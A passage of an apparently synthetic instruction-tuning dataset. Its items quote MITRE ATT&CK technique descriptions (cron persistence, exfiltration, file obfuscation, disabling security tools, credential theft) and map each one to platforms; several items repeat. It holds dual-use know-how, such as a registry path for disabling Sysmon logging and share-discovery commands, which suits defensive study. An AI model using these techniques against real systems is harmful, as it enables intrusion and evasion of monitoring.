    "output": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "answer": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code. The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for Persistence.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Scheduled Task/Job: Cron (T1053.003);\nTechnique Scheduled Task/Job: Cron (T1053.003) is applicable to platforms: macOS, Linux;\nTherefore, the given procedure description is related to platforms: macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code. The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for Persistence.",
      "answer": "The provided description is related to MITRE technique Scheduled Task/Job: Cron (T1053.003);\nTechnique Scheduled Task/Job: Cron (T1053.003) is applicable to platforms: macOS, Linux;\nTherefore, the given procedure description is related to platforms: macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
    "context": "",
    "output": "The provided description is related to MITRE technique Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003);\nTechnique Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
      "answer": "The provided description is related to MITRE technique Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003);\nTechnique Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
    "context": "",
    "output": "The provided description is related to MITRE technique Impair Defenses: Disable or Modify Tools (T1562.001);\nTechnique Impair Defenses: Disable or Modify Tools (T1562.001) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
      "answer": "The provided description is related to MITRE technique Impair Defenses: Disable or Modify Tools (T1562.001);\nTechnique Impair Defenses: Disable or Modify Tools (T1562.001) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Valid Accounts: Domain Accounts (T1078.002);\nTechnique Valid Accounts: Domain Accounts (T1078.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.",
      "answer": "The provided description is related to MITRE technique Valid Accounts: Domain Accounts (T1078.002);\nTechnique Valid Accounts: Domain Accounts (T1078.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may acquire user credentials from third-party password managers. Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory. Adversaries may extract credentials from memory via Exploitation for Credential Access.\n Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Credentials from Password Stores: Password Managers (T1555.005);\nTechnique Credentials from Password Stores: Password Managers (T1555.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may acquire user credentials from third-party password managers. Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory. Adversaries may extract credentials from memory via Exploitation for Credential Access.\n Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager.",
      "answer": "The provided description is related to MITRE technique Credentials from Password Stores: Password Managers (T1555.005);\nTechnique Credentials from Password Stores: Password Managers (T1555.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "answer": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may buy, lease, rent, or obtain physical servers\u00a0that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in Drive-by Compromise, enabling Phishing operations, or facilitating Command and Control. Instead of compromising a third-party Server or renting a Virtual Private Server, adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused. \n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.",
    "context": "",
    "output": "The provided description is related to MITRE technique Acquire Infrastructure: Server (T1583.004);\nTechnique Acquire Infrastructure: Server (T1583.004) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may buy, lease, rent, or obtain physical servers\u00a0that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in Drive-by Compromise, enabling Phishing operations, or facilitating Command and Control. Instead of compromising a third-party Server or renting a Virtual Private Server, adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused. \n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.",
      "answer": "The provided description is related to MITRE technique Acquire Infrastructure: Server (T1583.004);\nTechnique Acquire Infrastructure: Server (T1583.004) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Staged: Local Data Staging (T1074.001);\nTechnique Data Staged: Local Data Staging (T1074.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
      "answer": "The provided description is related to MITRE technique Data Staged: Local Data Staging (T1074.001);\nTechnique Data Staged: Local Data Staging (T1074.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Network Share Discovery (T1135);\nTechnique Network Share Discovery (T1135) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.",
      "answer": "The provided description is related to MITRE technique Network Share Discovery (T1135);\nTechnique Network Share Discovery (T1135) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
    "context": "",
    "output": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
      "answer": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
    "context": "",
    "output": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
